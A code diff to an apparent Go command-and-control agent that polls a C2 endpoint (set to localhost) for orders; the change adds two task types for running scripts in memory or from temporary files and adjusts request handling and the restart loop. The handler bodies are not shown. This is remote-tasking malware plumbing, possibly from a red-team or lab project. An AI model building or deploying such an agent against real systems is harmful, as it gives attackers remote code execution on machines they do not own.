@@ -25,6 +25,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -507,6 +508,12 @@ func processTask(task map[string]interface{}, results chan TaskResult) {
 	case "DOWNLOAD":
 		results <- processDownloadTask(task)
 		return
+	case "MEMORYSCRIPT":
+		results <- processScriptMemoryTask(task)
+		return
+	case "TEMPSCRIPT":
+		results <- processScriptTask(task)
+		return
 	}
 
 	logger.error("Invalid task type")
@@ -549,7 +556,7 @@ func addDefaultHeaders(request *http.Request) {
 /*
 	This function creates HTTP request object.
 */
-func createRequest(method string, body *bytes.Buffer) *http.Request {
+func createRequest(method string, body io.Reader) *http.Request {
 	request, error := http.NewRequest(
 		method,
 		"http://127.0.0.1:8000/c2/order/01223456789abcdef",
@@ -678,7 +685,7 @@ func runAgent() {
 
 		time_to_wait(order["NextRequestTime"].(int64))
 
-		request = createRequest("POST", bytes.NewBuffer(data))
+		request = createRequest("POST", bytes.NewReader(data))
 		addDefaultHeaders(request)
 		content = sendRequest(request, client)
 	}
@@ -699,8 +706,8 @@ func main() {
 	░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)
 
 	for {
-		time.Sleep(5 * time.Second)
 		runAgent()
 		logger.warning("Run agent end, restarting agent...")
+		time.Sleep(5 * time.Second)
 	}
 }
